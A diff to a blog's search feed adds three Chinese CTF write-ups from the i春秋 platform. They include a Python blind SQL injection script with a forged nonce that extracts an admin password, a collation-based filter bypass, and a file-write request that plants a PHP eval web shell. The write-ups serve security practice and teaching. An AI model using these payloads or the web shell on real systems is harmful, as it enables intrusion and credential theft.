@@ -4,6 +4,63 @@
   
     
     <entry>
+      <title>i春秋:Web-Notebook</title>
+      <link href="2021/06/03/i-chun-qiu-web-notebook/"/>
+      <url>2021/06/03/i-chun-qiu-web-notebook/</url>
+      
+        <content type="html"><![CDATA[<p>tips： 文件包含phpinfo是不是有新的发现</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> i春秋 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>i春秋:Web-Manager</title>
+      <link href="2021/06/02/i-chun-qiu-web-manager/"/>
+      <url>2021/06/02/i-chun-qiu-web-manager/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603184940414.png" alt="image-20210603184940414"></p><p>发现_nonce</p><p>扫描后台：</p><p>进入</p><pre><code>url/sources/login.js</code></pre><pre><code>$(document).keydown(function(e) {    if (e.keyCode == 222 || e.keyCode == 188 || e.keyCode == 190) {        alert("Illegal character");        return false;    }});function getnonce() {    var text = "";    var possible = "0123456789abcdef";    for (var i = 0; i &lt; 40; i++)        text += possible.charAt(Math.floor(Math.random() * possible.length));    return text;}$('#submit').click(function() {    this._nonce = getnonce();});</code></pre><pre><code>url/sources/bootstrap.js</code></pre><pre><code>  $(document).on('click.bs.alert.data-api', dismiss, Alert.prototype.close)}(jQuery);function sign (data, key) {    var privateKey    var i, j    var W = new Array(80)    var A, B, C, D, E    var H0 = 0x97B5D3F1    var H1 = 0x1F3D5B79    var H2 = 0x684A2C0E    var H3 = 0xE0C2A486    var H4 = 0x33221100    var H5 = 0xF0F0F0F0    var temp    var _RSA = function (n, s) {        var t4 = (n &lt;&lt; s) | (n &gt;&gt;&gt; (32 - s))        return t4    }    var _Rot = function (val) {        var str = ''        var i        var v        for (i = 7; i &gt;= 0; i--) {            v = (val &gt;&gt;&gt; (i * 4)) &amp; 0x0f            str += v.toString(16)        }        return str    }    str = unescape(encodeURIComponent(key + data))    var strLen = str.length    var wordArray = []    for (i = 0; i &lt; strLen - 3; i += 4) {        j = str.charCodeAt(i) &lt;&lt; 24 |            str.charCodeAt(i + 1) &lt;&lt; 16 |            str.charCodeAt(i + 2) &lt;&lt; 8 |            str.charCodeAt(i + 3)        wordArray.push(j)    }    switch (strLen % 4) {        case 0:            i = 0x080000000            break        case 1:            i = str.charCodeAt(strLen - 1) &lt;&lt; 24 | 0x0800000            break        case 2:            i = str.charCodeAt(strLen - 2) &lt;&lt; 24 | str.charCodeAt(strLen - 1) &lt;&lt; 16 | 0x08000            break        case 3:            i = str.charCodeAt(strLen - 3) &lt;&lt; 24 |                str.charCodeAt(strLen - 2) &lt;&lt; 16 |                str.charCodeAt(strLen - 1) &lt;&lt;            8 | 0x80            break    }    wordArray.push(i)    while ((wordArray.length % 16) !== 14) {        wordArray.push(0)    }    wordArray.push(strLen &gt;&gt;&gt; 29)    wordArray.push((strLen &lt;&lt; 3) &amp; 0x0ffffffff)    H0 ^= H5    H1 ^= H5    H2 ^= H5    H3 ^= H5    H4 ^= H5    for (privateKey = 0; privateKey &lt; wordArray.length; privateKey += 16) {        for (i = 0; i &lt; 16; i++) {            W[i] = wordArray[privateKey + i]        }        for (i = 16; i &lt;= 79; i++) {            W[i] = _RSA(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)        }        A = H0        B = H1        C = H2        D = H3        E = H4        for (i = 0; i &lt;= 19; i++) {            temp = (_RSA(A, 5) + ((B &amp; C) | (~B &amp; D)) + 0x5A820000 + E + W[i] + 0x00007999) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        for (i = 20; i &lt;= 39; i++) {            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0x6ED90000 + E + W[i] + 0x0000EBA1) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        for (i = 40; i &lt;= 59; i++) {            temp = (_RSA(A, 5) + ((B &amp; C) | (B &amp; D) | (C &amp; D)) + 0x8F1B0000 + E + W[i] + 0x0000BCDC) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        for (i = 60; i &lt;= 79; i++) {            temp = (_RSA(A, 5) + (B ^ C ^ D) + 0xCA620000 + E + W[i] + 0x0000C1D6) &amp; 0x0ffffffff            E = D            D = C            C = _RSA(B, 30)            B = A            A = temp        }        H0 = (H0 + A) &amp; 0x0ffffffff        H1 = (H1 + B) &amp; 0x0ffffffff        H2 = (H2 + C) &amp; 0x0ffffffff        H3 = (H3 + D) &amp; 0x0ffffffff        H4 = (H4 + E) &amp; 0x0ffffffff    }    temp = _Rot(H0) + _Rot(H1) + _Rot(H2) + _Rot(H3) + _Rot(H4)    return temp.toLowerCase()}$(document).ready(function() {    $("#" + "f" + "r" + "m" + "l" + "o" + "g" + "i" + "n").submit(function(e) {        var z1 = $("#" + "u" + "s" + "e" + "r" + "n" + "a" + "m" + "e").val();        var z2 = $("#" + "p" + "a" + "s" + "s" + "w" + "o" + "r" + "d").val();        $('&lt;' + 'i' + 'n' + 'p' + 'u' + 't' + '&gt;').attr({            type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n',            name: '_' + 'n' + 'o' + 'n' + 'c' + 'e',            value: sign(z1 + z2, "YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")        }).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n');    });});</code></pre><p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603183639838.png" alt="image-20210603183639838"></p><p>这里是对于sign的调用和_nonce的形成</p><p>通过sign()函数可以得到key 和 data 拼接方式。<br> str = unescape(encodeURIComponent(key + data))</p><p>用脚本吧：</p><pre><code>import hashlibimport requestsurl = "http://03581832d20d4ab59fe85fa2480f3ffce5f10e0fd8d040d7.changame.ichunqiu.com/login.php"headers = {"Content-Type": "application/x-www-form-urlencoded"}suffix = "YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD=="temp = ""for i in range(1, 50):    # 所有可见字符    for j in range(32, 127):        # 字段名包含特殊字符        payload = "'or ascii(substr(`p@ssw0rd`,{},1)) = {}#".format(            i, j)        info = suffix + payload + "1"        nonce = hashlib.sha1(info.encode("utf-8")).hexdigest()        data = "username={}&amp;password=1&amp;submit=&amp;_nonce={}&amp;a={}".format(payload, nonce, "a" * 21000)        r = requests.post(url, headers=headers, data=data)        # 猜测成功的请求长度为782        if "Incorrect password" in r.content.decode("utf-8"):            temp += chr(j)            print(temp)            break</code></pre><pre><code>MyIchunq1uSuperL0ng&amp;&amp;SecurePa$$word</code></pre><p><img src="/2021/06/02/i-chun-qiu-web-manager/image-20210603190858995.png" alt="image-20210603190858995"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> i春秋 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>i春秋:Web-Look</title>
+      <link href="2021/06/01/i-chun-qiu-web-look/"/>
+      <url>2021/06/01/i-chun-qiu-web-look/</url>
+      
+        <content type="html"><![CDATA[<p>扫后台发现vimnifo</p><p>![4fa0c3568642010563a1a97b9a258c9](C:/Users/H3ng/AppData/Local/Temp/WeChat Files/d202b37f60f616720bfa4776b0687a4.png)</p><p>进入5211ec9dde53ee65bb02225117fba1e1.php.backup<del>~</del>得到备份文件</p><pre><code>&lt;?php$con = mysql_connect('localhost','root','');mysql_query("set names utf8");mysql_select_db("ctf");if($_SERVER["REMOTE_ADDR"]=='8.8.8.8'){    $name = addslashes($_GET['usern3me']);}else{    if(stripos($_GET['usern3me'],'Bctf2O16')!==false){        $name = 'FUCK';    }    else{        $name = addslashes($_GET['usern3me']);    }}echo 'hello '.$name;$sql = "select * from admin where name='$name'";$result = mysql_query($sql);$num = mysql_num_rows($result);if($num&gt;0){    echo '&lt;br&gt;next ***.php';}?&gt;</code></pre><p>代码审计：</p><p>根据题目的提示，我以为是宽字节注入，但是尝试之后发现不行。因为还是老老实实想办法绕过Bctf2O16的过滤。</p><pre><code>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。可以看到大写O和Ö是相等的</code></pre><p>因此可以使用ç=c 或者ô=o</p><pre><code>5211ec9dde53ee65bb02225117fba1e1.php?usern3me=Bçtf2O16</code></pre><p><img src="/2021/06/01/i-chun-qiu-web-look/ea614e0bd60de72daf4d01f55faafec.png" alt="ea614e0bd60de72daf4d01f55faafec"></p><p>进入以后又是一段代码进行审计：</p><pre><code>&lt;?phpif(isset($_GET['path'])&nbsp;&amp;&amp;&nbsp;isset($_GET['filename'])){&nbsp;&nbsp;&nbsp;&nbsp;$path&nbsp;=&nbsp;$_GET['path'];&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;=&nbsp;"upload/".$_GET['filename'];}else{&nbsp;&nbsp;&nbsp;&nbsp;show_source(__FILE__);&nbsp;&nbsp;&nbsp;&nbsp;exit();}if(strpos($name,'..')&nbsp;&gt;&nbsp;-1){&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;'WTF';&nbsp;&nbsp;&nbsp;&nbsp;exit();}if(strpos($path,'http://127.0.0.1/')&nbsp;===&nbsp;0){&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($name,file_get_contents($path));}else{&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;'path&nbsp;error';}?&gt;</code></pre><pre><code>?filename=1.php&amp;path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php eval($_POST[1]);?&gt;</code></pre><p>因为有两个file函数所以要在burp中将空格也就是%20再urlencode一次变为%2520解析是才会为空格</p><p>然后蚁剑简洁</p><pre><code>url/upload/1.php</code></pre><p><img src="/2021/06/01/i-chun-qiu-web-look/ea5f97eaa4a22d10417703d95d4f16d.png" alt="ea5f97eaa4a22d10417703d95d4f16d"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> i春秋 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Web：JSONP注入</title>
       <link href="2021/05/29/web-jsonp-zhu-ru/"/>
       <url>2021/05/29/web-jsonp-zhu-ru/</url>
